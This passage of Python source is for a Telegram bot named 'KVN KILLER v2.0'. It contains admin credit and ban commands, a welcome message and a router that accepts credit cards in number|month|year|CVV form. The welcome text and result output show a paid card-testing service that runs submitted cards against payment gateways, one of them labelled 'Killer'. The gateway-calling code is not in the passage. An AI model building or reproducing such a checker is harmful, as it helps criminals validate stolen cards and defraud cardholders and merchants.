        f"║ • 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 (Killer): {killerT_status}\n"
        f"║ • 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 (Auth): {payrix_result}\n"
        f"╠═══════════════════════════╣\n"
        f"║ ⏱ Time: {elapsed_time}s\n"
        f"║ 💰 Credits Left: {credits_left}\n"
        f"╚═══════════════════════════╝"
    )

    try:
        # Edit the loading message with the final result
        bot.edit_message_text(result_message, chat_id, loading_message.message_id)
    except Exception as e:
        # If editing fails (e.g., message too old), send as a new reply
        print(f"[Main-{user_id}] Failed to edit final message: {e}. Sending new message.")
        bot.reply_to(message, result_message)

# --- Admin Commands ---
@bot.message_handler(commands=['addcredits'])
def add_credits(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "⛔ This command is restricted to the bot owner.")
        return
        
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "❌ Usage: `/addcredits @username amount` or `/addcredits user_id amount`", parse_mode="Markdown")
        return
        
    # Check if second argument is a user ID or username
    target = args[1]
    try:
        # If target is a username (starts with @)
        if target.startswith('@'):
            # We would need to resolve username to ID here, but Telegram API doesn't directly support this
            # We'll tell the admin to use ID instead
            bot.reply_to(message, "❌ Please use user ID instead of username.")
            return
        else:
            # Assume it's a user ID
            target_id = int(target)
    except ValueError:
        bot.reply_to(message, "❌ Invalid user ID. Please provide a valid numeric user ID.")
        return
        
    try:
        amount = int(args[2])
        if amount <= 0:
            bot.reply_to(message, "❌ Please specify a positive number of credits to add.")
            return
    except ValueError:
        bot.reply_to(message, "❌ Invalid amount. Please provide a valid numeric amount.")
        return
        
    # Add credits to the user
    update_credits(target_id, amount)
    
    # Confirm the action
    bot.reply_to(message, f"✅ Added {amount} credits to user ID: {target_id}")
    
    # Try to notify the user
    try:
        bot.send_message(target_id, f"💰 {amount} credits have been added to your account by the bot admin.")
    except Exception:
        # If we can't message the user (they haven't started the bot yet), just ignore
        pass

@bot.message_handler(commands=['ban'])
def ban_command(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "⛔ This command is restricted to the bot owner.")
        return
        
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "❌ Usage: `/ban user_id`", parse_mode="Markdown")
        return
        
    try:
        target_id = int(args[1])
    except ValueError:
        bot.reply_to(message, "❌ Invalid user ID. Please provide a valid numeric user ID.")
        return
        
    # Ban the user
    ban_user(target_id)
    
    # Confirm the action
    bot.reply_to(message, f"✅ User with ID {target_id} has been banned.")

@bot.message_handler(commands=['unban'])
def unban_command(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "⛔ This command is restricted to the bot owner.")
        return
        
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "❌ Usage: `/unban user_id`", parse_mode="Markdown")
        return
        
    try:
        target_id = int(args[1])
    except ValueError:
        bot.reply_to(message, "❌ Invalid user ID. Please provide a valid numeric user ID.")
        return
        
    # Unban the user by setting is_banned to 0
    execute_db("UPDATE users SET is_banned = 0 WHERE user_id = ?", (target_id,))
    
    # Confirm the action
    bot.reply_to(message, f"✅ User with ID {target_id} has been unbanned.")

@bot.message_handler(commands=['credits'])
def check_credits(message):
    user_id = message.from_user.id
    credits = get_credits(user_id)
    
    bot.reply_to(message, f"💰 You have {credits} credits remaining.")

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    user_id = message.from_user.id
    
    # Register user if they're not registered
    if not is_registered(user_id):
        execute_db("INSERT INTO users (user_id, credits, is_banned) VALUES (?, 0, 0)", (user_id,))
        
    welcome_message = """
🔥 *Welcome to KVN KILLER v2.0* 🔥

This bot checks credit card validity through multiple payment gateways.

*Commands:*
• Simply send a card in format: `xxxxxxxxxxxxxxxx|mm|yy|cvv`
• `/credits` - Check your remaining credits
• `/help` - Show this message

*For Admin:*
• `/addcredits user_id amount` - Add credits to a user
• `/ban user_id` - Ban a user
• `/unban user_id` - Unban a user

Contact the bot owner to purchase credits.
    """
    
    bot.reply_to(message, welcome_message, parse_mode="Markdown")

# Commands that are already handled by specific handlers
HANDLED_COMMANDS = ['/start', '/help', '/credits', '/addcredits', '/ban', '/unban']

# Main card check handler
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    # Check if it's a card check request
    if CC_PATTERN.search(message.text):
        cmd_check(message)
    # Check if this is a kill/check command that might be replying to another message
    elif any(cmd in message.text.lower() for cmd in ['/kill', '/check', '.kill', '#kill']):
        if message.reply_to_message:
            cmd_check(message)
        else:
            # It's a kill command but no card was found
            bot.reply_to(message, "❌ No valid card found. Please format as: `xxxxxxxxxxxxxxxx|mm|yy|cvv` or reply to a message containing a card.", parse_mode="Markdown")
    # Only respond with help if the message appears to be a direct command to the bot
    elif message.text.startswith('/') and not any(cmd in message.text for cmd in HANDLED_COMMANDS):
        # If it looks like a command but isn't recognized
        bot.reply_to(message, "❌ Unknown command. Type /help for available commands.", parse_mode="Markdown")
    # Don't respond to other random messages to avoid spam
    # This is intentionally left empty - no response to messages that aren't commands or cards

# Bot execution is now managed in main.py
# This file serves as a module with all the functionality
